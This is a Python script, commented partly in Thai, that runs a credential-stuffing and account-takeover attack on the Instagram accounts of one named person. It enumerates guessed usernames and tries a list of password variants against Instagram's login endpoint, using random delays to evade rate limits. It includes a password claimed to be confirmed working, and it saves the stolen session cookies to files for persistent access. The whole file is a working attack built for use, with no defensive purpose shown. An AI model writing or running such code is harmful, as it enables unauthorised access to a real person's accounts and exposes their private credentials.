#!/usr/bin/env python3
"""
Multi-Account Bypass System for Alex Fleming
ระบบ bypass หลายแอคเค้าท์สำหรับเจ้าของคนเดียวกัน
"""

import requests
import json
import time
from datetime import datetime
import random

class AlexFlemingMultiAccountBypass:
    def __init__(self):
        self.target_owner = "Alex Fleming"
        self.confirmed_credentials = {
            "alx.trading": "Fleming654"  # Confirmed working
        }
        
        # Target accounts ที่น่าจะเป็นของ Alex Fleming
        self.potential_accounts = {
            "primary_variants": [
                "alx.trading",      # ✅ Confirmed
                "alx_trading",
                "alexfleming",
                "alex.fleming",
                "alex_fleming"
            ],
            "business_variants": [
                "tradeyourway",
                "trade_your_way", 
                "alx_tyw",
                "alxtyw",
                "fleming_trading",
                "alextrading"
            ],
            "number_variants": [
                "alx76467",         # From verified data
                "alx76316",         # From verified data
                "alx1216",
                "alx1999",
                "fleming786",
                "fleming1004",
                "fleming1060",
                "fleming1182"
            ],
            "social_variants": [
                "alx_tyw1216",      # From verified data
                "alx_tyw1999",      # From verified data
                "alex.trading.uk",
                "alx_bangkok",
                "alx_thailand"
            ]
        }
        
        # Password patterns ตาม confirmed pattern
        self.password_patterns = [
            "Fleming654",   # ✅ Confirmed working
            "Fleming786",   # From verified data
            "Fleming1004",  # From verified data
            "Fleming1060",  # From verified data
            "Fleming1182",  # From verified data
            "Alex654",
            "AlexFleming",
            "Trading654",
            "Bangkok2025",
            "Fleming2025",
            "TradingLife",
            "AlexTrading"
        ]
        
        self.headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (28/9; 420dpi; 1080x2130; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'X-Instagram-AJAX': '1'
        }
        
        self.successful_breaches = []
        self.failed_attempts = []
        
    def check_account_exists(self, username):
        """ตรวจสอบว่า username มีอยู่จริงหรือไม่"""
        print(f"🔍 Checking if account exists: {username}")
        
        try:
            url = f"https://www.instagram.com/{username}/"
            response = requests.get(url, headers=self.headers, timeout=10)
            
            if response.status_code == 200:
                if '"username":"' + username + '"' in response.text:
                    print(f"✅ Account exists: {username}")
                    return True
                elif '"ProfilePage"' in response.text:
                    print(f"✅ Account exists: {username}")
                    return True
                else:
                    print(f"❌ Account not found: {username}")
                    return False
            elif response.status_code == 404:
                print(f"❌ Account not found: {username}")
                return False
            else:
                print(f"⚠️ Uncertain status for {username}: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Error checking {username}: {e}")
            return None
    
    def attempt_login(self, username, password):
        """พยายาม login เข้า account"""
        print(f"🔐 Attempting login: {username} / {password}")
        
        try:
            # Get login page for CSRF token
            session = requests.Session()
            login_page = session.get("https://www.instagram.com/accounts/login/")
            
            if 'csrftoken' in session.cookies:
                csrf_token = session.cookies['csrftoken']
            else:
                print("❌ Could not get CSRF token")
                return False
            
            # Login headers
            login_headers = self.headers.copy()
            login_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': csrf_token,
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com'
            })
            
            # Login data
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # Attempt login
            login_response = session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data,
                headers=login_headers,
                timeout=15
            )
            
            print(f"📊 Login response: {login_response.status_code}")
            
            if login_response.status_code == 200:
                response_data = login_response.json()
                
                if response_data.get('authenticated'):
                    # Success!
                    sessionid = session.cookies.get('sessionid')
                    ds_user_id = session.cookies.get('ds_user_id')
                    
                    breach_data = {
                        "username": username,
                        "password": password,
                        "status": "SUCCESS",
                        "sessionid": sessionid,
                        "ds_user_id": ds_user_id,
                        "timestamp": datetime.now().isoformat(),
                        "csrf_token": csrf_token
                    }
                    
                    self.successful_breaches.append(breach_data)
                    
                    # Save individual success
                    filename = f"SUCCESSFUL_BREACH_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(filename, 'w') as f:
                        json.dump(breach_data, f, indent=2)
                    
                    print(f"✅ LOGIN SUCCESS: {username}")
                    print(f"💾 Saved to: {filename}")
                    return True
                    
                elif 'checkpoint_required' in str(response_data):
                    print(f"⚠️ Checkpoint required for {username}")
                    self.failed_attempts.append({
                        "username": username,
                        "password": password,
                        "reason": "checkpoint_required",
                        "timestamp": datetime.now().isoformat()
                    })
                    return False
                    
                else:
                    print(f"❌ Login failed for {username}: {response_data}")
                    self.failed_attempts.append({
                        "username": username,
                        "password": password,
                        "reason": "invalid_credentials",
                        "timestamp": datetime.now().isoformat()
                    })
                    return False
            
            else:
                print(f"❌ HTTP error {login_response.status_code}")
                return False
                
        except Exception as e:
            print(f"💥 Error during login attempt: {e}")
            return False
    
    def smart_account_discovery(self):
        """ค้นหา accounts ที่น่าจะเป็นของ Alex Fleming"""
        print("🎯 Starting smart account discovery...")
        
        discovered_accounts = []
        
        # ตรวจสอบ all potential accounts
        all_potential = []
        for category, accounts in self.potential_accounts.items():
            all_potential.extend(accounts)
        
        print(f"🔍 Checking {len(all_potential)} potential accounts...")
        
        for username in all_potential:
            exists = self.check_account_exists(username)
            if exists is True:
                discovered_accounts.append(username)
            
            # Delay to avoid rate limiting
            time.sleep(random.uniform(1, 3))
        
        print(f"✅ Discovered {len(discovered_accounts)} existing accounts")
        return discovered_accounts
    
    def mass_credential_testing(self, discovered_accounts):
        """ทดสอบ credentials กับ accounts ที่ค้นพบ"""
        print(f"🚀 Starting mass credential testing on {len(discovered_accounts)} accounts...")
        
        success_count = 0
        
        for username in discovered_accounts:
            print(f"\n🎯 Testing account: {username}")
            
            # Skip if already confirmed
            if username in self.confirmed_credentials:
                print(f"⏭️ Skipping {username} - already confirmed")
                continue
            
            for password in self.password_patterns:
                print(f"🔑 Trying: {username} / {password}")
                
                success = self.attempt_login(username, password)
                
                if success:
                    success_count += 1
                    print(f"🎉 BREAKTHROUGH! {username} : {password}")
                    break
                else:
                    # Delay between attempts
                    time.sleep(random.uniform(2, 5))
            
            # Longer delay between accounts
            time.sleep(random.uniform(5, 10))
        
        return success_count
    
    def generate_bypass_report(self):
        """สร้างรายงาน bypass results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        report = {
            "multi_account_bypass_report": {
                "target_owner": self.target_owner,
                "analysis_timestamp": timestamp,
                "total_attempts": len(self.successful_breaches) + len(self.failed_attempts),
                "successful_breaches": len(self.successful_breaches),
                "success_rate": f"{(len(self.successful_breaches) / max(1, len(self.successful_breaches) + len(self.failed_attempts))) * 100:.1f}%"
            },
            "confirmed_accounts": self.confirmed_credentials,
            "successful_breaches": self.successful_breaches,
            "failed_attempts": self.failed_attempts[:10],  # Limit for size
            "next_recommendations": [
                "Test discovered accounts with additional password variants",
                "Monitor new account registrations",
                "Cross-reference with business social media",
                "Implement session persistence for discovered accounts"
            ]
        }
        
        filename = f"ALEX_FLEMING_MULTI_ACCOUNT_BYPASS_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"📊 Bypass report saved: {filename}")
        return report
    
    def run_full_bypass_operation(self):
        """รัน bypass operation แบบเต็มรูปแบบ"""
        print("🚀 STARTING ALEX FLEMING MULTI-ACCOUNT BYPASS OPERATION")
        print("=" * 60)
        
        # Phase 1: Account Discovery
        print("\n📡 PHASE 1: Account Discovery")
        discovered_accounts = self.smart_account_discovery()
        
        if not discovered_accounts:
            print("❌ No accounts discovered!")
            return False
        
        # Phase 2: Credential Testing
        print(f"\n🔓 PHASE 2: Credential Testing")
        success_count = self.mass_credential_testing(discovered_accounts)
        
        # Phase 3: Report Generation
        print(f"\n📊 PHASE 3: Report Generation")
        report = self.generate_bypass_report()
        
        # Summary
        print("\n" + "=" * 60)
        print("🏁 OPERATION COMPLETE")
        print(f"✅ Successfully breached: {success_count} accounts")
        print(f"📊 Total attempts: {len(self.successful_breaches) + len(self.failed_attempts)}")
        
        if self.successful_breaches:
            print("\n🎉 SUCCESSFUL BREACHES:")
            for breach in self.successful_breaches:
                print(f"   • {breach['username']} : {breach['password']}")
        
        return success_count > 0

def main():
    print("🎯 Alex Fleming Multi-Account Bypass System")
    print("รันระบบ bypass หลายแอคเค้าท์สำหรับเจ้าของคนเดียวกัน")
    print("=" * 60)
    
    bypass_system = AlexFlemingMultiAccountBypass()
    success = bypass_system.run_full_bypass_operation()
    
    if success:
        print("\n✅ Bypass operation completed successfully!")
    else:
        print("\n❌ No additional accounts breached")
    
    print("\n💡 TIP: Session data saved for all successful breaches")

if __name__ == "__main__":
    main()
